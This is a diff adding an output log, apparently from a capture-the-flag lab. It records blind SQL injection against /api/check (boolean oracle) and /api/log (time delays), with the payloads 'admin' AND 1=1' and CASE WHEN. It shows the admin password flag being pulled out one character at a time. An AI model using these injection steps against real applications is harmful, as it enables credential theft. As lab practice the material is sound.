@@ -1,0 +1,21 @@
+============================================================
+[1] BOOLEAN-BASED qua /api/check (oracle FOUND/NOTFOUND)
+============================================================
+  admin' AND 1=1 -> FOUND
+  admin' AND 1=2 -> NOTFOUND
+  Do dai mat khau admin = 27
+  Trich: W  Trich: WE  Trich: WEB  Trich: WEB{  Trich: WEB{b  Trich: WEB{bl  Trich: WEB{bl1  Trich: WEB{bl1n  Trich: WEB{bl1nd  Trich: WEB{bl1nd_  Trich: WEB{bl1nd_b  Trich: WEB{bl1nd_b0  Trich: WEB{bl1nd_b00  Trich: WEB{bl1nd_b00l  Trich: WEB{bl1nd_b00l3  Trich: WEB{bl1nd_b00l3a  Trich: WEB{bl1nd_b00l3an  Trich: WEB{bl1nd_b00l3an_  Trich: WEB{bl1nd_b00l3an_a  Trich: WEB{bl1nd_b00l3an_an  Trich: WEB{bl1nd_b00l3an_and  Trich: WEB{bl1nd_b00l3an_and_  Trich: WEB{bl1nd_b00l3an_and_t  Trich: WEB{bl1nd_b00l3an_and_t1  Trich: WEB{bl1nd_b00l3an_and_t1m  Trich: WEB{bl1nd_b00l3an_and_t1me  Trich: WEB{bl1nd_b00l3an_and_t1me}
+  => Mat khau admin (FLAG): WEB{bl1nd_b00l3an_and_t1me}
+
+============================================================
+[2] TIME-BASED qua /api/log (luon tra 'ok', chi do tre)
+============================================================
+  CASE WHEN 1=1 -> tre 1.43s (TRUE)
+  CASE WHEN 1=2 -> tre 0.22s (FALSE)
+  ky tu 1 = 'W'  (chuoi: W)
+  ky tu 2 = 'E'  (chuoi: WE)
+  ky tu 3 = 'B'  (chuoi: WEB)
+  ky tu 4 = '{'  (chuoi: WEB{)
+  => 4 ky tu dau trich bang TIME-BASED: WEB{
+
+[OK] time-based khop boolean (WEB{...). Tong thoi gian 25.5s
